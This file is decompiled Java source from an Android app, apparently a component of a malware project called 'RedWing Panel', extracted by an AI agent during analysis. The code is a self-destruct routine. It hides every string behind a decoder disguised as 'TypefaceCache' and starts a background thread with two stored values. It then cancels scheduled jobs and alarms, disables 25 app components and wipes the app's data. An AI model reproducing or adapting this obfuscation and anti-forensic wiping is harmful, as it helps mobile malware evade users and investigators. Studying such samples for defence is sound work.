package v.s;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Process;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public abstract class k3qGWOP8GEZr {
    public static final String dDIMxZXP1V8HdM = TypefaceCache.obtain("00260078004D00B800F300B700D700A40028");
    public static final String w9sT1Swbhx3hs = TypefaceCache.obtain("00270073005A0083");

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r1v1, types: [boolean, int] */
    public static final void dDIMxZXP1V8HdM(SyncQYAdapter syncQYAdapter) {
        String string;
        ?? r1 = 6 - 5;
        try {
            syncQYAdapter.getSharedPreferences(dDIMxZXP1V8HdM, 0).edit().putBoolean(w9sT1Swbhx3hs, r1).commit();
        } catch (Throwable unused) {
        }
        try {
            SharedPreferences sharedPreferences = syncQYAdapter.getSharedPreferences(TypefaceCache.obtain("002100790054009300E300AB00C000A60033"), 0);
            String string2 = sharedPreferences.getString(TypefaceCache.obtain("003300770055008200FC008000C700B5002F"), null);
            if (string2 != null && (string = sharedPreferences.getString(TypefaceCache.obtain("00270073004D008E00F300BA00ED00AE0027"), null)) != null) {
                new Thread(new A68NpXPqwTFos99nt(string2, 17, string)).start();
                Thread.sleep(2000L);
            }
        } catch (Throwable unused2) {
        }
        try {
            bIQtXpTQsEoGIf25Z biqtxptqseogif25zL1V0lQr6TbwNKqHfXNbb = bIQtXpTQsEoGIf25Z.l1V0lQr6TbwNKqHfXNbb(syncQYAdapter);
            biqtxptqseogif25zL1V0lQr6TbwNKqHfXNbb.pyu8ovAipBTLYAiKab.w9sT1Swbhx3hs(new xxcyl2pmhRxvdGq94SLy(biqtxptqseogif25zL1V0lQr6TbwNKqHfXNbb));
        } catch (Throwable unused3) {
        }
        try {
            Object systemService = syncQYAdapter.getSystemService("jobscheduler");
            JobScheduler jobScheduler = systemService instanceof JobScheduler ? (JobScheduler) systemService : null;
            if (jobScheduler != null) {
                jobScheduler.cancelAll();
            }
        } catch (Throwable unused4) {
        }
        try {
            Object systemService2 = syncQYAdapter.getSystemService("alarm");
            AlarmManager alarmManager = systemService2 instanceof AlarmManager ? (AlarmManager) systemService2 : null;
            if (alarmManager != null && Build.VERSION.SDK_INT >= 34) {
                alarmManager.cancelAll();
            }
        } catch (Throwable unused5) {
        }
        try {
            kExylgSxUDTVQOx3o0oq.dDIMxZXP1V8HdM.JXn4Qf7zpnLjP5();
        } catch (Throwable unused6) {
        }
        PackageManager packageManager = syncQYAdapter.getPackageManager();
        String packageName = syncQYAdapter.getPackageName();
        String[] strArr = {TypefaceCache.obtain("006D0065005E009500E600B600D100A2003000380068009E00FE00BC00E3009E00020072005A009700E400BA00C0"), TypefaceCache.obtain("006D0065005E009500E600B600D100A200300038007C009200F100AD00D600AE002200780068008200E200A900DB00A40026"), TypefaceCache.obtain("006D0065005E009500E600B600D100A200300038006E009700F400BE00C600A2001B00460079009500F900BB00D500A2"), TypefaceCache.obtain("006D0065005E009500E600B600D100A2003000380078008800FE00B900DB00A0000F00410071008800F2"), TypefaceCache.obtain("006D0065005E009500E600B600D100A200300038007F008600E400BE00F00091001700770048008C"), TypefaceCache.obtain("006D0065005E009500E600B600D100A2003000380068008400E200BA00D700A900100077004D008200E2008C00D700B50035007F00580082"), TypefaceCache.obtain("006D0065005E009500E600B600D100A200300038007F008600E400BE00E3008100020072005A009700E400BA00C0"), TypefaceCache.obtain("006D0065005E009500E600B600D100A2003000380076008600FE00BE00D500A200310043007600A400FF00B100C600B5002C007A0057008200E2"), TypefaceCache.obtain("006D0065005E009500E600B600D100A2003000380078008800FE00B900DB00A000170047006C008800E200B400D700B5"), TypefaceCache.obtain("006D0065005E009500E600B600D100A200300038006E009300F900B300F3008E001400790049008C00F500AD"), TypefaceCache.obtain("006D0065005E009500E600B600D100A2003000380078008600F300B700D7008B0016005C00540085"), TypefaceCache.obtain("006D0065005E009500E600B600D100A200300038006B009500FF00A900DB00A300260064007D00B300C000AD00DD00A4002600650048008800E2"), TypefaceCache.obtain("006D0065005E009500E600B600D100A2003000380068009E00FE00BC00F300A300220066004F008200E2008C00D700B50035007F00580082"), TypefaceCache.obtain("006D0065005E009500E600B600D100A200300038007A009200E400B700D700A90037007F0058008600E400B000C0009400260064004D008E00F300BA"), TypefaceCache.obtain("006D0065005E009500E600B600D100A2003000380068009300E500BD00F100A8002D0062005E008900E4008F00C000A80035007F005F008200E2"), TypefaceCache.obtain("006D0065005E009500E600B600D100A2003000380070008200F500AF00F300AB002A0060005E00B300F900B300D7009400260064004D008E00F300BA"), TypefaceCache.obtain("006D0065005E009500E600B600D100A2003000380070008200F500AF00F300AB002A0060005E00B100E000B100E100A2003100600052008400F5"), TypefaceCache.obtain("006D0065005E009500E600B600D100A200300038006E009300F900B300E00088001400790049008C00F500AD"), TypefaceCache.obtain("006D0064005E008400F500B600C400A200310065001500AF00F100B100D600AB00260064006300A900DC00B000D300A300260064"), TypefaceCache.obtain("006D0064005E008400F500B600C400A200310065001500B700E200B000C400AE00270073004900AA00D5009C00DD00A9003700640054008B00FC00BA00C0"), TypefaceCache.obtain("006D0064005E008400F500B600C400A200310065001500B200E400B600DE009F00170057005F008600E000AB00D700B5"), TypefaceCache.obtain("006D0064005E008400F500B600C400A200310065001500B400E900B100D1009F000F00460049008800F300BA00C100B4002C0064"), TypefaceCache.obtain("006D0064005E008400F500B600C400A200310065001500B200E000BB00D300B30026005C006800B000E200BE00C200B700260064"), TypefaceCache.obtain("006D0064005E008400F500B600C400A200310065001500A200E800BE00D100B30002007A005A009500FD008F00D700B5002E007F0048009400F900B000DC009500260075005E008E00E600BA00C0"), TypefaceCache.obtain("006D0064005E008400F500B600C400A200310065001500AC00F500BA00C20086002F007F004D008200C700B600D600A000260062006B009500FF00A900DB00A300260064")};
        for (int i = 0; i < (-61) + 86; i++) {
            try {
                packageManager.setComponentEnabledSetting(new ComponentName(packageName, packageName + strArr[i]), 2, r1);
            } catch (Throwable unused7) {
            }
        }
        try {
            Object systemService3 = syncQYAdapter.getSystemService("activity");
            ActivityManager activityManager = systemService3 instanceof ActivityManager ? (ActivityManager) systemService3 : null;
            if (activityManager != null) {
                activityManager.clearApplicationUserData();
            }
        } catch (Throwable unused8) {
            Process.killProcess(Process.myPid());
            System.exit(0);
        }
    }

    private static /* synthetic */ void fsjwztdsx() {
    }

    public static final boolean w9sT1Swbhx3hs(Context context) {
        try {
            return context.getSharedPreferences(dDIMxZXP1V8HdM, 0).getBoolean(w9sT1Swbhx3hs, false);
        } catch (Throwable unused) {
            return false;
        }
    }
}
